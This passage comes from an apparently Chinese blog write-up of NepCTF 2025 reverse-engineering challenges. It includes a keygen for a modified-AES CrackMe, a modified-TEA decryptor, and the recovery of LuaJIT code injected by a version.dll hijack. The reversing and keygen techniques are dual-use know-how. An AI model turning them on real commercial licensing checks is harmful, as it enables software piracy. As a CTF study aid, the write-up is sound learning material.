class="number">0x36</span>;</span><br><span class="line">    v7[<span class="number">12</span>] = <span class="number">0x60</span>;</span><br><span class="line">    v7[<span class="number">13</span>] = <span class="number">0xC7</span>;</span><br><span class="line">    v7[<span class="number">14</span>] = <span class="number">0xE8</span>;</span><br><span class="line">    v7[<span class="number">15</span>] = <span class="number">6</span>;</span><br><span class="line">    v7[<span class="number">16</span>] = <span class="number">0x33</span>;</span><br><span class="line">    v7[<span class="number">17</span>] = <span class="number">0x78</span>;</span><br><span class="line">    v7[<span class="number">18</span>] = <span class="number">0xF0</span>;</span><br><span class="line">    v7[<span class="number">19</span>] = <span class="number">0xD0</span>;</span><br><span class="line">    v7[<span class="number">20</span>] = <span class="number">0x36</span>;</span><br><span class="line">    v7[<span class="number">21</span>] = <span class="number">0xC8</span>;</span><br><span class="line">    v7[<span class="number">22</span>] = <span class="number">0x73</span>;</span><br><span class="line">    v7[<span class="number">23</span>] = <span class="number">0x1B</span>;</span><br><span class="line">    v7[<span class="number">24</span>] = <span class="number">0x65</span>;</span><br><span class="line">    v7[<span class="number">25</span>] = <span class="number">0x40</span>;</span><br><span class="line">    v7[<span class="number">26</span>] = <span class="number">0xB5</span>;</span><br><span class="line">    v7[<span class="number">27</span>] = <span class="number">0xD4</span>;</span><br><span class="line">    v7[<span class="number">28</span>] = <span class="number">0xE8</span>;</span><br><span class="line">    v7[<span class="number">29</span>] = <span class="number">0x9C</span>;</span><br><span class="line">    v7[<span class="number">30</span>] = <span class="number">0x65</span>;</span><br><span class="line">    v7[<span class="number">31</span>] = <span class="number">0xF4</span>;</span><br><span class="line">    v7[<span class="number">32</span>] = <span class="number">0xBA</span>;</span><br><span class="line">    v7[<span class="number">33</span>] = <span class="number">0x62</span>;</span><br><span class="line">    v7[<span class="number">34</span>] = <span class="number">0xD0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sub_401A60</span>(data, v7, <span class="number">35</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, v7[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NepCTF&#123;Y0u_FiN1sH_Th1s_E3sy_Smc!!!&#125;</span></span><br></pre></td></tr></table></figure><p><strong>NepCTF{Y0u_FiN1sH_Th1s_E3sy_Smc!!!}</strong></p><h2 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h2><p>字符串定位到核心函数。</p><p>判断Password是否符合正则。</p><p><img src="/2025/07/28/NepCTF2025/image-11.png" alt="alt text"></p><p>将Password直接unhex，判断转成的字节长度是否等于16。说明我们要输入32个字符。</p><p><img src="/2025/07/28/NepCTF2025/image-12.png" alt="alt text"></p><p>主流程如下：</p><p>1.MD5_Custom(Username)的值作为密钥。</p><p>2.MD5_Custom(Username+”Showmaker11”)作为密文在下面判断</p><p>3.AES_Custom(Password, Key)</p><p>4.判断AES结果是否等于第二步的密文</p><p>解密就是MD5获取密钥，将第二步MD5值作为密文进行AES解密即可得到对应Password十六进制。</p><p><img src="/2025/07/28/NepCTF2025/image-10.png" alt="alt text"></p><p>MD5是libcrypto.dll里面的函数，可以直接调用，不需要逆向。</p><p>AES也是libcrypto.dll的函数，但是存在代码流混淆和魔改，将代码块打乱到不同的位置，不过还是可以通过观察知道那些代码块对应AES流程中的哪一步。</p><p>可以找到Sbox，发现是没有魔改的值。</p><p><img src="/2025/07/28/NepCTF2025/image-13.png" alt="alt text"></p><p>通过对比AES标准代码，去找一些关键点进行断点，且将密文密钥同步到标准AES代码调用，对此时程序的密文数据与标准AES的密文数据进行对比，看看是哪一步开始对不上，就是魔改的地方。</p><p>发现在MixColumns处出现数据对不上，可以看到对比标准代码多异或上了0x55。</p><p><img src="/2025/07/28/NepCTF2025/image-15.png" alt="alt text"></p><p><img src="/2025/07/28/NepCTF2025/image-14.png" alt="alt text"></p><p>经过修改标准AES代码，进行加密验证，发现和该程序的AES加密结果能对上，说明就只有MixColumns一处进行了魔改，这样就可以写注册机了。</p><p>注册机代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;AES.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">GetPassword</span><span class="params">(std::string UserName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> hLibCrypto = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;libcrypto_.dll&quot;</span>);</span><br><span class="line">    DWORD* (*MD5_)(<span class="type">const</span> <span class="type">char</span>*, <span class="type">int</span>, <span class="type">uint8_t</span>*, <span class="type">int</span>) = (DWORD * (*)(<span class="type">const</span> <span class="type">char</span>*, <span class="type">int</span>, <span class="type">uint8_t</span>*, <span class="type">int</span>))(<span class="built_in">GetProcAddress</span>(hLibCrypto, <span class="string">&quot;sign&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> Key[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MD5_</span>(UserName.<span class="built_in">c_str</span>(), UserName.<span class="built_in">length</span>(), Key, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> Cipher[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> Str1 = UserName + <span class="string">&quot;Showmaker11&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MD5_</span>(Str<span class="number">1.</span><span class="built_in">c_str</span>(), Str<span class="number">1.l</span>ength(), Cipher, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> Password_bytes[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// invMixColumns 异或 0x55</span></span><br><span class="line">    <span class="built_in">aesDecrypt</span>(Key, <span class="number">16</span>, Cipher, Password_bytes, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    std::string Password;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> Buffer[<span class="number">10</span>]&#123;&#125;;</span><br><span class="line">        <span class="built_in">sprintf_s</span>(Buffer, <span class="string">&quot;%02x&quot;</span>,Password_bytes[i]);</span><br><span class="line">        Password += Buffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">GetPassword</span>(<span class="string">&quot;inkey&quot;</span>) &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4ac06ab6f14dfc1bbfa65d00c9cd012b</span></span><br></pre></td></tr></table></figure><p>最后将网页上的名称都存到本地文件，修改注册机代码，一键获取Password，然后手动填写到网页提交即可得到Flag。</p><p><img src="/2025/07/28/NepCTF2025/image-16.png" alt="alt text"></p><p><img src="/2025/07/28/NepCTF2025/image-17.png" alt="alt text"></p><h2 id="QRS"><a href="#QRS" class="headerlink" title="QRS"></a>QRS</h2><p>运行，发现启动了一个服务，网页打开提示这个，应该是用input参数提交Flag进行Check。</p><p><img src="/2025/07/28/NepCTF2025/image-18.png" alt="alt text"></p><p>IDA字符串搜索missing field，查看交叉调用找到调用方函数，断点在返回处。</p><p><img src="/2025/07/28/NepCTF2025/image-19.png" alt="alt text"></p><p>调试运行程序，网页打开触发断点，往上走两层，走到如下函数。</p><p><img src="/2025/07/28/NepCTF2025/image-20.png" alt="alt text"></p><p>在该函数下面会看到这边有个函数调用，如果网页访问带input参数传入文本，mark2函数就会传入input的明文，以及获取的一串key。</p><p>加密完，下面也从xmm获取数据，进行cmp比对，那么下面的那两串xmm数据就应该是密文，mark2是加密函数。</p><p><img src="/2025/07/28/NepCTF2025/image-22.png" alt="alt text"></p><p>mark2核心加密代码如下，是一个魔改的Tea加密，而Delta使用GetTickCount，应该是未知的，但是实际调试发现不管什么时候这边获取到的TickCount都是固定的，值为：0x68547369。</p><p><img src="/2025/07/28/NepCTF2025/image-23.png" alt="alt text"></p><p>提取密文和密钥，编写解密即可得到Flag。</p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dec</span><span class="params">(DWORD &amp;v24, DWORD &amp;v25, DWORD Tick)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x01234567</span>, <span class="number">0x89ABCDEF</span>, <span class="number">0xFEDCBA98</span>, <span class="number">0x76543210</span>&#125;;</span><br><span class="line">    DWORD TickCount = Tick;</span><br><span class="line">    <span class="type">int</span> v26 = <span class="number">48</span>;</span><br><span class="line">    DWORD v28 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    v28 = TickCount * <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        v28 -= TickCount;</span><br><span class="line">        v25 -= (v24 + ((<span class="number">16</span> * v24) ^ (v24 &gt;&gt; <span class="number">5</span>))) ^ (v28 + TickCount + key[(((v28 + TickCount) &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0xC</span>) / <span class="number">4</span>]);</span><br><span class="line">        v24 -= (v25 + ((<span class="number">16</span> * v25) ^ (v25 &gt;&gt; <span class="number">5</span>))) ^ (key[v28 &amp; <span class="number">3</span>] + v28);</span><br><span class="line">        --v26;</span><br><span class="line">    &#125; <span class="keyword">while</span> (v26);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> enc[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0x083EA621</span>, <span class="number">0xC745973C</span>, <span class="number">0xE3B77AE8</span>, <span class="number">0xCDEE8146</span>, <span class="number">0x7DC86B96</span>, <span class="number">0x6B8C9D3B</span>, <span class="number">0x79B14342</span>, <span class="number">0x2ECF0F0D</span>&#125;;</span><br><span class="line"></span><br><span class="line">    DWORD v1&#123;&#125;, v2&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> s = <span class="number">0</span>; s &lt; <span class="number">4</span>; s++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = enc[s * <span class="number">2</span>], v2 = enc[s * <span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">Dec</span>(v1, v2, <span class="number">0x68547369</span>);</span><br><span class="line">        enc[s * <span class="number">2</span>] = v1;</span><br><span class="line">        enc[s * <span class="number">2</span> + <span class="number">1</span>] = v2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NepCTF&#123;%.32s&#125;\n&quot;</span>, enc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NepCTF&#123;a4747f82be106d3f8c4d747c744d7ee5&#125;</span></span><br></pre></td></tr></table></figure><h2 id="SpeedMino-Warlock"><a href="#SpeedMino-Warlock" class="headerlink" title="SpeedMino-Warlock"></a>SpeedMino-Warlock</h2><p>可以从文件结构知道使用了Love框架，右键exe用压缩包打开就可以得到lua源码。</p><p>main.lua里面解密出来是fake flag。</p><p>IDA加载version.dll，发现字符串存在lovely-injector，那么这个version.dll就是lovely-injector项目的，用于劫持注入修改lua代码。</p><p><img src="/2025/07/28/NepCTF2025/image-24.png" alt="alt text"></p><p>由于该lovely-injector源码被出题人修改过，并没有输出任何文件或log到本地，只能通过其他方法得到即将被注入的lua代码，下面提供两种方法。</p><h3 id="法一：CE直接搜索"><a href="#法一：CE直接搜索" class="headerlink" title="法一：CE直接搜索"></a>法一：CE直接搜索</h3><p>原程序main.lua这部分代码是获取剪贴板内容，然后进行calcData加密与下面的假flag密文比对，尝试在CE搜索result_table，看看有没有其他的调用代码。</p><p><img src="/2025/07/28/NepCTF2025/image-25.png" alt="alt text"></p><p>可以搜到两处。</p><p><img src="/2025/07/28/NepCTF2025/image-26.png" alt="alt text"></p><p>可以看到其中一个是在一个没见过的lua代码里面调用的，这边从NEURO，也就是上面那些字节加载了一个luajit函数，传入result_table进行了Check，然后输出”PERFECT!”，那么上面这个luajit函数就是真实的Check函数。</p><p><img src="/2025/07/28/NepCTF2025/image-27.png" alt="alt text"></p><h3 id="法二：启用dump-all参数"><a href="#法二：启用dump-all参数" class="headerlink" title="法二：启用dump_all参数"></a>法二：启用dump_all参数</h3><p>查阅lovely-injector项目源码，发现init这边有个dump_all参数，用于dump即将要被注入的代码，</p><p><img src="/2025/07/28/NepCTF2025/image-32.png" alt="alt text"></p><p>在version.dll的dllmain函数中，可以看到这边有判断是否有”–dump-all”参数，来启用dump_all功能。</p><p><img src="/2025/07/28/NepCTF2025/image-28.png" alt="alt text"></p><p>断点给dump_all_bool赋值0的地方，步过执行一步，将rsi改成1，然后运行，就会弹出dump字节，也就是luajit代码。</p><p><img src="/2025/07/28/NepCTF2025/image-31.png" alt="alt text"></p><p><img src="/2025/07/28/NepCTF2025/image-30.png" alt="alt text"></p><h3 id="luajit分析"><a href="#luajit分析" class="headerlink" title="luajit分析"></a>luajit分析</h3><p>将上面的得到的luajit字节输出到文件，使用<a href="https://github.com/weaweawe01/luajit_decompile%E9%A1%B9%E7%9B%AE%E8%BF%9B%E8%A1%8Cluajit%E5%8F%8D%E7%BC%96%E8%AF%91%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0%E5%A6%82%E4%B8%8Blua%E4%BB%A3%E7%A0%81%E3%80%82">https://github.com/weaweawe01/luajit_decompile项目进行luajit反编译，可以得到如下lua代码。</a></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">slot1 = <span class="function"><span class="keyword">function</span><span class="params">(slot0, slot1)</span></span></span><br><span class="line">        slot2 = <span class="number">0</span> + slot0 * <span class="number">384</span> + slot1</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></span><br><span class="line">                slot3 = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></span><br><span class="line">                        <span class="keyword">if</span> slot2 &lt; slot3 * slot3 <span class="keyword">and</span> (slot2 - <span class="number">1</span>) % <span class="number">5</span> ~= <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">                                <span class="keyword">return</span> slot2</span><br><span class="line">                        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> slot2 % slot3 == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">                        slot3 = slot3 + <span class="number">1</span></span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">                slot2 = slot2 + <span class="number">1</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">383</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">slot2 = &#123;</span><br><span class="line">        <span class="number">36506</span>,</span><br><span class="line">        <span class="number">88774</span>,</span><br><span class="line">        <span class="number">438822</span>,</span><br><span class="line">        <span class="number">666001</span>,</span><br><span class="line">        <span class="number">109051</span>,</span><br><span class="line">        <span class="number">2124674</span>,</span><br><span class="line">        <span class="number">2767204</span>,</span><br><span class="line">        <span class="number">2610244</span>,</span><br><span class="line">        <span class="number">3272321</span>,</span><br><span class="line">        <span class="number">8662979</span>,</span><br><span class="line">        <span class="number">5131975</span>,</span><br><span class="line">        <span class="number">1034228</span>,</span><br><span class="line">        <span class="number">6712315</span>,</span><br><span class="line">        <span class="number">12760199</span>,</span><br><span class="line">        <span class="number">20058866</span>,</span><br><span class="line">        <span class="number">6854477</span>,</span><br><span class="line">        <span class="number">6126314</span>,</span><br><span class="line">        <span class="number">3871829</span>,</span><br><span class="line">        <span class="number">13815442</span>,</span><br><span class="line">        <span class="number">15034520</span>,</span><br><span class="line">        <span class="number">38884726</span>,</span><br><span class="line">        <span class="number">10742135</span>,</span><br><span class="line">        <span class="number">26199509</span>,</span><br><span class="line">        <span class="number">45230422</span>,</span><br><span class="line">        <span class="number">46725610</span>,</span><br><span class="line">        <span class="number">7627278</span>,</span><br><span class="line">        <span class="number">21052590</span>,</span><br><span class="line">        <span class="number">68432885</span>,</span><br><span class="line">        <span class="number">48719842</span>,</span><br><span class="line">        <span class="number">94974872</span>,</span><br><span class="line">        <span class="number">55215219</span>,</span><br><span class="line">        <span class="number">113201828</span>,</span><br><span class="line">        <span class="number">86070272</span>,</span><br><span class="line">        <span class="number">153897959</span>,</span><br><span class="line">        <span class="number">136736481</span>,</span><br><span class="line">        <span class="number">88243015</span>,</span><br><span class="line">        <span class="number">108020790</span>,</span><br><span class="line">        <span class="number">71691707</span>,</span><br><span class="line">        <span class="number">157143593</span>,</span><br><span class="line">        <span class="number">22399026</span>,</span><br><span class="line">        <span class="number">41588356</span>,</span><br><span class="line">        <span class="number">220309217</span>,</span><br><span class="line">        <span class="number">86844145</span>,</span><br><span class="line">        <span class="number">129645965</span>,</span><br><span class="line">        <span class="number">240111657</span>,</span><br><span class="line">        <span class="number">257783827</span>,</span><br><span class="line">        <span class="number">92900284</span>,</span><br><span class="line">        <span class="number">52969902</span>,</span><br><span class="line">        <span class="number">27539801</span>,</span><br><span class="line">        <span class="number">275411785</span>,</span><br><span class="line">        <span class="number">364406385</span>,</span><br><span class="line">        <span class="number">253200306</span>,</span><br><span class="line">        <span class="number">389008554</span>,</span><br><span class="line">        <span class="number">359199685</span>,</span><br><span class="line">        <span class="number">337450915</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (<span class="function"><span class="keyword">function</span> <span class="params">(slot0)</span></span></span><br><span class="line">        slot1 = <span class="number">1</span></span><br><span class="line">        slot2 = &#123;</span><br><span class="line">                <span class="number">359</span>,</span><br><span class="line">                <span class="number">383</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> #uv0 ~= #slot0 <span class="keyword">then</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> slot6 = <span class="number">1</span>, #slot0 <span class="keyword">do</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="number">64</span> + slot0[slot6])^<span class="number">5</span> % (slot2[slot6] * slot2[slot6 + <span class="number">1</span>]) ~= uv0[slot6] <span class="keyword">then</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">                slot2[slot6 + <span class="number">2</span>] = uv1(slot6, slot0[slot6])</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span>)(slot0)</span><br></pre></td></tr></table></figure><p>直接对应编写解密即可，然后还需要再解密一层CalcData加密。</p><p>解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">Enc = [</span><br><span class="line">    <span class="number">36506</span>, <span class="number">88774</span>, <span class="number">438822</span>, <span class="number">666001</span>, <span class="number">109051</span>, <span class="number">2124674</span>, <span class="number">2767204</span>, <span class="number">2610244</span>,</span><br><span class="line">    <span class="number">3272321</span>, <span class="number">8662979</span>, <span class="number">5131975</span>, <span class="number">1034228</span>, <span class="number">6712315</span>, <span class="number">12760199</span>, <span class="number">20058866</span>,</span><br><span class="line">    <span class="number">6854477</span>, <span class="number">6126314</span>, <span class="number">3871829</span>, <span class="number">13815442</span>, <span class="number">15034520</span>, <span class="number">38884726</span>, <span class="number">10742135</span>,</span><br><span class="line">    <span class="number">26199509</span>, <span class="number">45230422</span>, <span class="number">46725610</span>, <span class="number">7627278</span>, <span class="number">21052590</span>, <span class="number">68432885</span>, <span class="number">48719842</span>,</span><br><span class="line">    <span class="number">94974872</span>, <span class="number">55215219</span>, <span class="number">113201828</span>, <span class="number">86070272</span>, <span class="number">153897959</span>, <span class="number">136736481</span>,</span><br><span class="line">    <span class="number">88243015</span>, <span class="number">108020790</span>, <span class="number">71691707</span>, <span class="number">157143593</span>, <span class="number">22399026</span>, <span class="number">41588356</span>,</span><br><span class="line">    <span class="number">220309217</span>, <span class="number">86844145</span>, <span class="number">129645965</span>, <span class="number">240111657</span>, <span class="number">257783827</span>, <span class="number">92900284</span>,</span><br><span class="line">    <span class="number">52969902</span>, <span class="number">27539801</span>, <span class="number">275411785</span>, <span class="number">364406385</span>, <span class="number">253200306</span>, <span class="number">389008554</span>,</span><br><span class="line">    <span class="number">359199685</span>, <span class="number">337450915</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">2</span> <span class="keyword">or</span> n == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">or</span> n % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="built_in">int</span>(math.sqrt(n)) + <span class="number">1</span>, <span 